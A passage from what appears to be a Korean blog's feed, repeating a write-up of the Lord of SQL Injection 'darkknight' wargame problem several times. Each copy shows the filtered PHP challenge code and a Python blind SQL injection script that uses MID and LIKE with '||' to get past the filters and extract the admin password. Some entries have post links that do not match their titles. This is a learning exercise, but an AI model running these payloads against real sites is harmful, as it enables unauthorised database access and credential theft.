class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-18-nightmare/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-18-nightmare/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>LIKE</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">    data = <span class="string">"-1 || length(pw) LIKE &#123;&#125;#"</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(j) == <span class="string">'%'</span> <span class="keyword">or</span> chr(j) == <span class="string">'_'</span>): <span class="comment"># LIKE 를 사용하므로 와일드카드인 %와 _는 제외</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="</span></span><br><span class="line">        data = <span class="string">'-1 || MID(pw, 1, &#123;&#125;) LIKE "&#123;&#125;"#'</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정, MID 함수 사용, = 을 LIKE 로 수정, ' 를 "로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>1c62ba6f</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-25-umaru/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-25-umaru/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-09-09T05:38:15.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 12번 darkknight 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkknight 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span 